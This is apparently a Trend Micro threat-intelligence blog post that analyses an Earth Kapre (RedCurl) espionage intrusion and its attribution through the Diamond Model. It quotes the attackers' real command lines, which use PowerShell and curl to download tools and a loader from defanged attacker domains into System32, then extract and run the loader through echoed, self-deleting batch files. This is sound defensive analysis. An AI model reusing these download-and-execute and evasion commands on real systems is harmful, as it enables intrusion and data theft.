	<h1 class="article-details__title">Unveiling Earth Kapre aka RedCurl’s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence </h1>
	<p class="article-details__description">This blog entry will examine Trend Micro MDR team&#39;s investigation that successfully uncovered the intrusion sets employed by Earth Kapre in a recent incident, as well as how the team leveraged threat intelligence to attribute the extracted evidence to the cyberespionage threat group.</p>

            <div class="richText">
	
    


	
		<div>
			<p>The espionage group Earth Kapre (aka RedCurl and Red Wolf) has been actively conducting phishing campaigns targeting organizations in Russia, Germany, Ukraine, the United Kingdom, Slovenia, Canada, Australia, and the US. It uses phishing emails that contain malicious attachments (.iso and .img), which lead to successful infections upon opening. This triggers the creation of a scheduled task for persistence, alongside the unauthorized collection and transmission of sensitive data to command-and-control (C&amp;C) servers.</p>
<p>The Trend Micro Managed Extended Detection and Response (MDR) and Incident Response (IR) team conducted an investigation of an incident where numerous machines were infected by the Earth Kapre downloader.  This piece of malware was observed establishing connections with its C&amp;C servers, suggesting a potential data theft scenario. Interestingly, in this instance, Earth Kapre has returned to using a previously known technique that is distinct from its more recent campaigns: It used legitimate tools <i>Powershell.exe</i> and <i>curl.exe</i> to procure the subsequent stage downloader. In an attempt to blend into the network and evade detection, Earth Kapre<i> </i>was found to have used the Program Compatibility Assistant (<i>pcalua.exe</i>) to execute malicious command lines.</p>
<p>This blog entry will examine Trend Micro MDR team's investigation that successfully uncovered the intrusion sets employed by Earth Kapre in a recent incident, as well as how the team leveraged threat intelligence to attribute the extracted evidence to the cyberespionage threat group.</p>
<h2><span class="body-subhead-title">MDR investigation</span></h2>
<p>The Trend Micro MDR threat hunting team initially detected the creation of a suspicious file in <i>C:\Windows\System32\ms.dll</i> (detected by Trend Micro as Trojan.Win64.CRUDLER.A). Further investigation revealed the use of <i>curl.exe</i> to download the file from the following URLs:</p>
<ul>
<li><span class="rte-red-bullet">http://preston[.]melaniebest[.]com/ms/ms.tmp</span></li>
<li><span class="rte-red-bullet">https://preslive[.]cn[.]alphastoned.pro/ms/msa.tmp</span></li>
<li><span class="rte-red-bullet">https://unipreg[.]tumsun[.]com/ms/psa.tmp</span></li>
<li><span class="rte-red-bullet">http://report[.]hkieca[.]com/ms/msa.tmp</span></li>
</ul>
<p> </p>

		</div>
	

</div>
            <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/24/c/unveiling-earth-kapre-aka-redcurl-cyberespionage-tactics-with-trend-micro-mdr-threat-intelligence/Fig1_Earth%20Kapre.png" alt="Figure 1. Trend Vision One™ Execution Profile shows the downloaded Earth Kapre loader using “curl.exe” from “http://preston[.]melaniebest[.]com” (23[.]254[.]224[.]79). "/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 1. Trend Vision One™ Execution Profile shows the downloaded Earth Kapre loader using “curl.exe” from “http://preston[.]melaniebest[.]com” (23[.]254[.]224[.]79). </figcaption>
			
		</div>
	</figure>

</div>
            <div>




    
    
    <div class="richText">
	
    


	
		<div>
			<p>After examining the events around the time the file was created, we discovered that the threat actor executed the following actions:</p>
<p>We observed that the initial command employs PowerShell to download a file (<i>curl.tmp</i>) from the URL <i>http://preston[.]melaniebest[.]com/ms/curl.tmp</i> and saves it as <i>curl.exe</i> in the <i>C:\Windows\System32\</i> directory. For the benefit of this analysis, we will use this domain, but the same analysis should hold for the other domains in the previously mentioned list of URLs. <i>Curl.exe</i> is a command-line tool and library designed for efficient data transfer with URLs. While it is a legitimate tool, it can also be abused by threat actors for malicious purposes.</p>
<p><span class="blockquote">%COMSPEC% /Q /c echo powershell -c &quot;iwr -Uri http://preston[.]melaniebest[.]com/ms/curl.tmp -OutFile C:\Windows\System32\curl.exe -UseBasicParsing&quot; ^&gt; \\127.0.0.1\C$\dvPqyh 2^&gt;^&amp;1 &gt; %TEMP%\KzIMnc.bat &amp; %COMSPEC% /Q /c %TEMP%\KzIMnc.bat &amp; %COMSPEC% /Q /c del %TEMP%\KzIMnc.bat</span></p>
<p>Next, <i>7za.tmp</i> was downloaded and saved as <i>7za.exe</i> in <i>C:\Windows\System32\</i> directory. <i>7za.exe </i>is a copy of 7-Zip, a popular open-source file compression and archiving utility.</p>
<p><span class="blockquote">C:\Windows\system32\cmd.exe /Q /c echo curl -o C:\Windows\System32\7za.exe http://preston[.]melaniebest[.]com/ms/7za.tmp ^&gt; \\127.0.0.1\C$\xWJhao 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\IAqJUm.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\IAqJUm.bat &amp; C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\IAqJUm.bat</span></p>
<p>The Earth Kapre loader was then downloaded using <i>curl.exe</i> from the same domain, <i>http://preston[.]melaniebest[.]com/ms/ms.tmp</i>, and was saved as <i>ms.dll</i> (though it should be noted that in some machines, the file name used was <i>ps.dll</i>) in the <i>C:\Windows\System32\</i> directory. The threat actors used <i>echo</i> (as also seen in previous commands) and outputted it into a batch file, which is a commonly employed obfuscation technique. By echoing the command into a batch file, they could dynamically generate and execute commands, making it harder to analyze or detect malicious activities. The use of temporary batch files also allows for task automation and easier security monitoring evasion. We observed that the threat actors deleted the batch file afterward to cover their tracks.</p>
<p><span class="blockquote">C:\Windows\system32\cmd.exe /Q /c echo curl -o C:\Windows\System32\ms.dll http://preston[.]melaniebest.com/ms/ms.tmp ^&gt; \\127.0.0.1\C$\tZpOKq 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\DFMPAa.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\DFMPAa.bat &amp; C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\DFMPAa.bat</span></p>
<p>Since <i>ms.tmp</i> is an archive, the threat actors would need to use the previously downloaded <i>7za.exe</i> (<i>7zip</i>) to extract file contents via the password “123”.</p>
<p><span class="blockquote">C:\Windows\system32\cmd.exe /Q /c echo 7za.exe x -aoa -p123 C:\Windows\Temp\ms.tmp -o C:\Windows\Temp\ ^&gt; \\127.0.0.1\C$\lgNMiK 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\BuWmUA.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\BuWmUA.bat &amp; C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\BuWmUA</span></p>
<p><i>Rundll32.exe</i> was then used to execute <i>ms.dll</i> on the machine (in some machines, <i>ps.dll</i> was executed).</p>

			<h2><span class="body-subhead-title">Using the Diamond Model of Intrusion Analysis</span></h2>
<p><a href="https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/diamond-model-intrusion-analysis/">The Diamond Model of Intrusion Analysis</a> is a cybersecurity framework that’s crucial for intrusion analysis. It decodes cyberthreats by focusing on four key aspects: adversary, infrastructure, capability, and victim. Understanding the who, why, and how of cyberattacks helps cybersecurity professionals predict and prepare for threats. It explores the geographical origin, identity, sponsorship, motivation, and timeline of adversaries.</p>
<ul>
<li><span class="rte-red-bullet">Adversary: Threat Actor/Attacker</span></li>
<li><span class="rte-red-bullet">Capabilities: Adversary’s tools and/or techniques</span></li>
<li><span class="rte-red-bullet">Infrastructure: Physical and/or logical resources used by the adversary</span></li>
<li><span class="rte-red-bullet">Victim: Organization or system hit by the adversary</span></li>
</ul>
<p>By analyzing these four components together, the Diamond Model of Intrusion Analysis helps cybersecurity professionals and analysts gain a comprehensive understanding of a cyberthreat and aids in attributing the threat to a specific adversary or group. It provides a structured approach to organizing and analyzing available data, enhancing the ability of security teams to make informed decisions about cybersecurity strategies and responses.</p>

		</div>

		<div>
			<p>In the Diamond Model, we apply the &quot;Rule of Two&quot; guide, seeking consistent combinations across various intrusion sets. If a particular combination exhibits two vertices in the Diamond Model, there is a better likelihood that we are confronting the same threat actor.</p>
<p>In our analysis of this case, within the capability vertices of the Diamond Model, we compared the Earth Kapre sample from the wild with the Earth Kapre sample acquired from the customer's environment. While the new samples showed an updated structure, both samples connect to the same infrastructure. This consistency in capability and infrastructure strongly suggests an association with the Earth Kapre group.</p>
<h2><span class="body-subhead-title">Conclusion</span></h2>
<p>This case underscores the ongoing and active threat posed by Earth Kapre, a threat actor that targets a diverse range of industries across multiple countries. The actor employs sophisticated tactics, such as abusing PowerShell, curl, and Program Compatibility Assistant (<i>pcalua.exe</i>) to execute malicious commands, showcasing its dedication to evading detection within targeted networks.</p>
<p>The detection of Impacket activity within the organization's network reveals a concerning trend in the abuse of this tool for Windows network protocol interactions. Threat actors are capitalizing on Impacket's versatility and exploiting its functionalities for unauthorized command execution.</p>
<p>This report emphasizes the significance of threat intelligence in bridging gaps within investigations, filling missing pieces of evidence that are crucial for comprehensive understanding and protection. Understanding the threat actor behind an attack is paramount for organizations seeking to bolster their defenses. This knowledge not only aids in identifying potential motives but also allows for the implementation of tailored security measures to help prevent specific threats.</p>
<p>The role of MDR in uncovering intrusion sets, as demonstrated in this recent incident investigation, exemplifies its critical contribution to cybersecurity. MDR played a key role in attributing the evidence extracted from the attack to the Earth Kapre threat group. This reinforces the essential role of advanced threat detection and response solutions in effectively countering sophisticated threat actors.</p>
